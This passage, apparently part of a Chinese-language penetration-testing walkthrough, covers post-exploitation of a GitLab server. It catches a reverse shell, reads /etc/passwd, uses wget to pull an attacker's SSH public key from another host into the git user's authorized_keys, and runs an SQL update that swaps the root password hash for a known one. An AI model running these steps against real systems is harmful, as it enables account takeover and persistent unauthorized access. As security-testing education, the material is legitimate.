
在攻击机器192.168.2.97上监听9999端口

![](../Images/fc02bf857633911d7a8c7cda1ac19f2b.png)

设置漏洞利用脚本的target(192.168.2.83)和port(10000)值

![](../Images/c565be46e4f6cabba9d520aa5378d53f.png)

python3运行脚本，成功反弹shell

![](../Images/87f130123b92de0fa83dfbbc3ec4bcdc.png)

在linux下，web目录仅仅只有root用户具有写权限。获取的git用户无写权限。  
发现git用户具有操作数据库权限，而gitlab自带了访问数据库的命令：gitlab-rails dbconsole  
在反弹的shell处，敲入gitlab-rails dbconsole 无法成功访问，一直卡着，如下图：

![](../Images/118075db4691599755dea64f37a45eae.png)

查看/etc/passwd

![](../Images/5899b3be99279982e3f1cecaa0825468.png)

gti用户具有ssh登录权限，向git用户用户写入公钥进行登录，写入公钥的命令方式又很多种，这里使用wget命令  
先将生成的公钥放在远程服务器下，在反弹shell处将公钥下载到受害者机器上  
wget http://192.168.2.62:8001/gitlab\_git.pub

![](../Images/b7a3287dc68d0de24f4ec12263506e04.png)

![](../Images/ac22961deec46c10e97b1264f3d949b8.png)

默认情况下git用户的authorized\_keys内容为空，如果存在内容的话，先备份一下，再写入。  
写入成功后进行ssh登录即可。登录后如下

![](../Images/64d6e199907d29d660dc5cbfafe4dc8d.png)

再次执行gitlab-rails dbconsole 命令  
成功获取数据库权限

![](../Images/5ec7e925419bd6b92f89147e9c33b98f.png)

查看有哪些数据表

![](../Images/c955f3f92e5b1cd1379bb4e62821b5a8.png)

![](../Images/0557fdd4543f630bc3db78a103ca3fba.png)

发现users表，格式化输出root用户的信息，ps: root的id为1

![](../Images/e5901d985d7ef334b2832f029a22cde9.png)

根据密码特征，可以发现是bcrypt加密，这种加密针对同一种明文每次加密后的密文不一样。也就是说不可逆，但运气好的话，可在cmd5中解开，但又因为gitlab默认的密码策略是8个字符。  
最委托的办法就是修改root用户的密码密文值。关于bcrypt加密算法参考https://blog.csdn.net/fengyingkong/article/details/87377061  
12345678的密文值为$2a$10$9sM0WeC3WSDCx9HWwr7z7eV3h3Q/tPxP7G2kvCWxWqdJemid1lICa  
执行如下sql命令：  
update users set encrypted\_password='$2a$10$9sM0WeC3WSDCx9HWwr7z7eV3h3Q/tPxP7G2kvCWxWqdJemid1lICa' where e id =1;

![](../Images/b6c600a894661fbc08314045b9270c94.png)

注意：在实战情况下，修改root密码密文前，先备份一下，事后恢复。修改成功后，使用root/12345678登录

![](../Images/1739f959f2c0e7755f69edb2719e676f.png)

![](../Images/8b376f1e691352ecca050822f04cc948.png)

![](../Images/cf011d0b1cdad890f1d0d278029eb54e.png)

![](../Images/b5239cd302a420fa7dfffabe0d6a7e74.png)
